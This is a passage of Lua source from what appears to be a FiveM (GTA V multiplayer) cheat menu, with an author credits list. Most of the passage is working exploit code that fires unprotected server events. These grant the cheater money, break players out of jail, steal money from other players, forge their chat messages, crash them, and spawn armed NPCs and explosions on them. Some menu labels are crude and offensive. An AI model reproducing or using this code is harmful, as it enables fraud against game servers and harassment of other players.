				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
				TriggerServerEvent('AdminMenu:giveBank', 500000)        
				TriggerServerEvent("AdminMenu:giveCash", 500000)
				TriggerServerEvent("esx_gopostaljob:pay", 500000)
				TriggerServerEvent("AdminMenu:giveBank", 500000)
				TriggerServerEvent("esx_truckerjob:pay", 500000)
				TriggerServerEvent("esx_carthief:pay", 500000)
			    TriggerServerEvent("esx_garbagejob:pay", 500000)
				TriggerServerEvent("esx_ranger:pay", 500000)
				TriggerServerEvent("esx_truckersjob:payy", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				drawNotification("Money deposited succesfully")
				elseif Plane.Button("Taxijob ESX 10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif Plane.Button("Give yourself money (VRP)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif Plane.Button("Give yourself 10x salary (VRP)") then
				a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
				a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
                elseif Plane.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif Plane.Button("~h~~b~Open Jail Menu ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif Plane.Button("ESX Get Out Of Jail") then
                    local ped = PlayerPedId(-1)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
					TriggerServerEvent("esx_jailer:unjailTime", -1)
					TriggerServerEvent("JailUpdate", 0)
					TriggerEvent("UnJP")
                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif Plane.Button("Suicide") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  Plane.CheckBox(
                    "God Mode",
                    godmode,
                    function(enabled)
                    godmode = enabled
                    end)
                then
				elseif  Plane.CheckBox(
                    "Invisible",
                    invisible,
                    function(enabled)
                    invisible = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Infinite Stamina",
                    infStamina,
                    function(enabled)
                    infStamina = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Fast Run",
                    fastrun,
                    function(enabled)
                        fastrun = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Super Jump",
                    SuperJump,
                    function(enabled)
                        SuperJump = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Noclip",
                    Noclip,
                    function(enabled)
                        Noclip = enabled
                    end)
                then
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Plane.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    Plane.Display()
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~Brutan#3927 - Owner") then
				elseif Plane.Button("∑~o~~h~cr0#2154 - Owner") then
				elseif Plane.Button("∑~y~~h~antonio#7777 - Developer") then
				elseif Plane.Button("∑~g~~h~someone#6222 - Helping tons") then
				elseif Plane.Button("∑~b~~h~woahh#5555 - Helping/testing tons") then
				elseif Plane.Button("∑~p~~h~goliat#8888 - Developer") then
				elseif Plane.Button("∑~h~BRUTAN Menu - Inspiration") then
				end
				Plane.Display()
                elseif Plane.IsMenuOpened("PlayerOptionsMenu") then
                    Plane.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if Plane.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif Plane.Button("Rape Player") then
					    rapeplayer()
					elseif Plane.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif Plane.Button("Teleport To Player With Vehicle") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
                    elseif Plane.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
					elseif Plane.Button("~g~Give ~w~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
                    elseif Plane.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif Plane.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif Plane.MenuButton("ESX Options", "PlayerESXMenu") then
                    elseif Plane.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif Plane.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif Plane.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif Plane.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif Plane.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(0)
                            end

                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotification("~g~Vehicle Given To Player!")
                        else
                            drawNotification("~r~Model is not valid!")
                        end
					elseif Plane.Button('Clone Car') then
                    ClonePedVeh()
					elseif Plane.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = nil
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    print("~")
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                        print("~")
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        print("~")
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, true)
                        SetEntityInvincible(v1, true)
                        if DoesEntityExist(v) then
                            print("~")
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                print("~")
                                Citizen.Wait(50)
                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    print("~")
                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    print("~")
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    print("~")
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                    end
                end)
                    elseif Plane.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif Plane.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif Plane.Button("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
                    elseif Plane.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
                    end

                    Plane.Display()
                elseif Plane.IsMenuOpened("PlayerESXMenu") then
                    if Plane.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif Plane.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    Plane.Display()
                elseif Plane.IsMenuOpened("PlayerESXTriggerMenu") then
                    if Plane.Button("ESX Revive") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif Plane.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif Plane.Button("ESX Give Money To Player From Your Wallet") then
                        local d = KeyboardInput("Enter amount of money to give","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif Plane.Button("ESX Steal Money From Player") then
                        local d=KeyboardInput("Enter amount of money to steal","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif Plane.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif Plane.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif Plane.Button("ESX Get Out Of Jail") then
                        local ped = selectedPlayer
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                    end

                    Plane.Display()
                elseif Plane.IsMenuOpened("PlayerESXJobMenu") then
                    if Plane.Button("Unemployed") then
                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif Plane.Button("Police") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
                    elseif Plane.Button("Mechanic") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
                    elseif Plane.Button("Taxi") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif Plane.Button("Ambulance") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif Plane.Button("Real Estate Agent") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif Plane.Button("Car Dealer") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end


                    Plane.Display()
                elseif Plane.IsMenuOpened("PlayerTrollMenu") then
                    if Plane.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
				elseif Plane.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					
                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                    elseif Plane.Button("Cage Player") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif Plane.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif Plane.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                            freezePlayer = enabled
                        end)
                    then
                    elseif Plane.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                    elseif Plane.Button("~b~Isis Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                    end

                    Plane.Display()
                elseif Plane.IsMenuOpened("SpawnPropsMenu") then
                    if Plane.CheckBox(
                        "Attach Prop To Player",
                        attachProp,
                        function(enabled)
                            attachProp = enabled
                        end)
                    then
                    elseif Plane.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif Plane.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif Plane.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif Plane.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif Plane.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end
                        else
                            drawNotification("Invalid Model!")
                        end
                    end

                    Plane.Display()
            elseif Plane.IsMenuOpened("VehicleRamMenu") then
                if Plane.Button("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                elseif Plane.Button("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                end


                    Plane.Display()
            elseif Plane.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Plane.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                    end
                end


                Plane.Display()
            elseif Plane.IsMenuOpened("WeaponMenu") then
                if Plane.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
                elseif Plane.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                elseif Plane.Button("Remove All Weapons") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif Plane.Button("Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                    end
                elseif Plane.CheckBox(
                    "No Reload",
                    InfClip,
                    function(enabled)
                        InfClip = enabled
                        SetPedInfiniteAmmoClip(PlayerPedId(), InfClip)
                    end)
                then
                elseif Plane.CheckBox(
                    "Infinite Ammo",
                    InfAmmo,
                    function(enabled)
                        InfAmmo = enabled
                        SetPedInfiniteAmmo(PlayerPedId(), InfAmmo)
                    end)
                then
                elseif Plane.CheckBox(
                    "Explosive Ammo",
                    explosiveAmmo,
                    function(enabled)
                        explosiveAmmo = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Oneshot",
                    Oneshot,
                    function(enabled)
                        Oneshot = enabled
                    end)
                then
                elseif Plane.CheckBox(
                    "Delete Gun",
                    DeleteGun,
                    function(enabled)
                        DeleteGun = enabled
